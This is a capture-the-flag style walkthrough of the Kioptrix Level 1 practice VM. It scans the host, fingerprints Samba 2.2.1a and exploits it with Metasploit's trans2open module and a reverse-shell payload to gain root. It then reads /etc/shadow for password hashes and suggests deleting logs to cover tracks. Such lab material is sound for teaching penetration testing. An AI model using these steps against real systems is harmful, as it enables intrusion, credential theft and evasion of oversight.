Kioptrix is a group of virtual machines that have been made vulnerable on purpose for people to practice and learn penetration testing techniques. Penetration testing is a way to identify and exploit weaknesses in different operating systems and web applications to enhance cybersecurity skills.

The Kioptrix virtual machines simulate real-life situations and are designed to have weaknesses that can be exploited in different ways such as buffer overflows, SQL injection, and cross-site scripting. By practicing on Kioptrix, you can get hands-on experience in detecting and exploiting these vulnerabilities and learn how to protect systems and applications against potential attacks.

It's important to note that Kioptrix is a legal and ethical way of practicing penetration testing because it's solely meant for educational purposes and shouldn't be used for malicious activities.

First of the Kioptrix series can be found at <a href="https://www.vulnhub.com/" target="_blank">VulnHub</a>.

<a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/" target="_blank">https://vulnhub.com/entry/kioptrix-level-1-1,22/</a>

## Preparation

Besides Kioptrix's image file, obviously, you need software to run it. Paid <a href="https://www.vmware.com/products/fusion.html" target="_blank">VMware Fusion</a> or free <a href="https://www.virtualbox.org/wiki/Downloads" target="_blank">Virtual Box</a> will be the best way to go. I don't want to focus here on how to run the VM itself, as this is really very intuitive and there are plenty of tutorials on how to do that.

If you're setting up your offensive system and Kioptrix on the same machine, the best solution is to set both Network Adapters as Bridged. Bridged networking connects your virtual machine to a network using the network adapter on your host system. If your host system is on a network, this is the easiest way to give your virtual machine access to that network.

Bridged networking also sets up your virtual machine as a unique identity on the network, separate from and unrelated to your host system. Your virtual machine becomes a full participant in the network, with access to other machines on the network, and other machines on the network can contact it as if it were a physical computer on the network.

After setting everything up, you have to just run the Kioptrix machine. You don't have to log in (and you cannot, as you don't have a password yet), just leave it on in the background and use your default preferred Linux distribution to start the game.

## Tools

You will need also a Linux distribution - the best choice will be <a href="https://www.kali.org/get-kali/#kali-platforms" target="_blank">Kali Linux</a> or <a href="https://parrotsec.org/download/" target="_blank">Parrot OS</a>, as both of those distros are penetration testing focused and have all tools that you need.

* arp-scan
* nikto
* nmap
* msfconsole
* searchsploit

If you prefer, you can use any Linux distribution, however, please be sure you have installed the above apps.

## Reconnaissance

So first we have to determine the IP address of our Kioptrix victim machine. To do that, we will open terminal and use ```sudo arp-scan -l```.

Sudo command allows a system administrator to delegate authority to give certain users the ability to run commands as root. ARP-scan is a tool that uses the ARP protocol to discover and fingerprint IP hosts on the local network. -l	attribute can generate list from interface address and netmask.

```shell
┌──(kali㉿kali)-[~]
└─# sudo arp-scan -l

```

In my case, I can see that the IP for vulnerable host run through VMware is 192.168.0.14. At this point, I can check and visit this IP address via browser to confirm there is an HTTP service running on port 80.

## Scanning

Additionally, the next command we're going to use to gather even more intel is ```nikto -h 192.168.0.14```.

[Nikto](https://github.com/sullo/nikto){:target="_blank" rel="noopener"} is a web server scanner that checks a website for many possible security problems, such as dangerous files, misconfigured services, and vulnerable scripts. However, it's important to note that Nikto isn't a subtle tool. It will make more than 2000 HTTP GET requests to the web server, which will generate a lot of entries in the server's log files. This activity is a great way to test any existing intrusion detection systems, like log monitoring for the web server. So, if there is a Nikto scan running, these security systems will be able to detect it.

The tool showed us a lot of potential security flaws on port 80, however, after close checking, we can determine that many of them are false positives and simply don't exist on this host. There are some free or paid alternatives for Nikto, however, most of them have disadvantages, and the best ones, like Nessus, are licensed and quite expensive.

Although vulnerabilities related to Apache servers can be interesting, I want to learn more about this particular host. I'm using [Nmap](https://nmap.org/book/man.html){:target="_blank" rel="noopener"} (“Network Mapper”) to scan the host and determine which other ports are open and what network services are running on the machine - ```sudo nmap -sSV -O 192.168.0.14```.

There are a couple of interesting things here. -sS is a TCP SYN stealth scan that can be performed quickly, scanning thousands of ports per second on a fast network not hampered by intrusive firewalls. SYN scan is relatively unobtrusive and stealthy since it never completes TCP connections. With -sV and -O attributes we can try to detect the service version and host operating system. If this would be a real server with Intrusion Detection System, I would probably resign with -sV and set -T1 to be less suspicious for the host's IDS.  

```shell

Our scan revealed that we have some open ports and interested outdated services, which could be used as points of entry for a potential attack. This information is a good place to start... Now we know that besides port 80, we have open also 22, 111, 139, 443, 1024 and the running system is Linux 2.4.X. As I already know from a cybersecurity [report by Tenable](https://www.tenable.com/blog/vulnerabilities-by-common-ports-dashboard){:target="_blank" rel="noopener"}, a company that makes a popular cybersecurity tool called Nessus, some of them can be more interesting than others.

<a href="/images/commonports.png"><img src="/images/commonports.png"></a>

According to their report, the protocols HTTP/80, HTTPS/443, and SMB/445 are the most vulnerable to serious cyber attacks. However, even though SSH has a high number of vulnerabilities too, only 3% of those can actually be exploited by attackers. So, for now, I am going to shift my focus towards Samba which uses port 139 on the Kioptrix host. As Samba can utilize port 139 for older versions or 445 for newer ones, this shows me again how outdated and vulnerable can be this service.

## Exploitation

Now it's time to use a jack-of-all-trade tool - [Metasploit](https://www.metasploit.com/){:target="_blank" rel="noopener"}. This is a penetration testing framework, which is used to find vulnerabilities and exploit them in various systems and applications. It provides a suite of tools and techniques for penetration testers and security researchers to test and evaluate the security of systems and applications. Metasploit allows users to create their own custom modules for testing specific vulnerabilities and can also be integrated with other security tools and platforms. Its ease of use, flexibility, and large user community make it a popular tool for security professionals and researchers.

You can run Metasploit framework with a command ```msfconsole```.

There are a lot of options and commands for this tool that can be found eg. on the [OffSec website](https://www.offsec.com/metasploit-unleashed/msfconsole-commands/){:target="_blank" rel="noopener"}. As for now, we will try to determine the Samba version on the host. Let's check if there is a module that can help me with that...

```shell
msf6 > search smb version

It seems there is a particular module [auxiliary/scanner/smb/smb_version](https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/smb/smb_version){:target="_blank" rel="noopener"} for SMB version detection. Let's use it then.

```shell
msf6 > use 9
msf6 auxiliary(scanner/smb/smb_version) > 
```

Now we also have to set a remote host address...

```shell
msf6 auxiliary(scanner/smb/smb_version) > set rhost 192.168.0.14
rhost => 192.168.0.14
```

...and run the module.

```shell
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.0.14:139      - SMB Detected (versions:) (preferred dialect:) (signatures:optional)

```

Looks like we have now the specific version of the service - Samba 2.2.1a. In the new console, I will use [SearchSploit](https://www.exploit-db.com/searchsploit){:target="_blank" rel="noopener"} - a command line search tool for [Exploit-DB](https://www.exploit-db.com/){:target="_blank" rel="noopener"}.

Using this default [linux/x86/meterpreter/reverse_tcp](https://www.infosecmatter.com/metasploit-module-library/?mm=payload/linux/x86/meterpreter/reverse_tcp){:target="_blank" rel="noopener"} payload doesn't lead us anywhere so I'm sending a ^C kill signal by pressing CTRL+C to cancel the module. I'm checking what else payloads we can set for this module...

It seems like the exploit was successful, but the Meterpreter sessions were shutting down almost immediately., but the Meterpreter sessions were shutting down almost immediately. Metasploit has two types of payloads: Stager and Inline. The difference between them is that Stager payloads use small "stagers" to fit into small exploitation spaces. When exploiting, the developer usually has a limited amount of memory they can manipulate through the program inputs they are exploiting. Stagers are placed in this space and their only job is to download the rest of the "staged" payload. However, the downside is that these payloads need a connection to something that will send them the rest of the payload. Inline payloads do not have this problem. They are self-contained and can function without any additional support. Let's try to use the Inline version of Reverse TCP payload then...

```shell
msf6 exploit(linux/samba/trans2open) > set payload 33
payload => linux/x86/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > run

```

This time session did not die. By using ```bash -i``` I'm trying to spawn a TTY interface that enables access to the terminal. If the -i option is present, the shell is interactive.

```shell
bash -i
bash: no job control in this shell
[root@kioptrix tmp]# whoami
whoami
root
```

I'm using the command ```whoami``` to check my permission level and voilà! We have a root!

## Maintaining Access

As root, we can modify and check nearly every aspect of the Linux system, so let's take a look at the file that contains the encrypted passwords of all users.

```shell
[root@kioptrix tmp]# cat /etc/shadow
cat /etc/shadow

With the contents of this file, we get hashes of all passwords so we can then attempt to decrypt them in order to gain access to the system as a regular user or with root privileges in the future. Additionally, we can try to remove any system logs to cover our tracks.

Of course, there are other methods to gain access to this Kioptrix machine, but I hope you find this one both helpful and enjoyable 😀
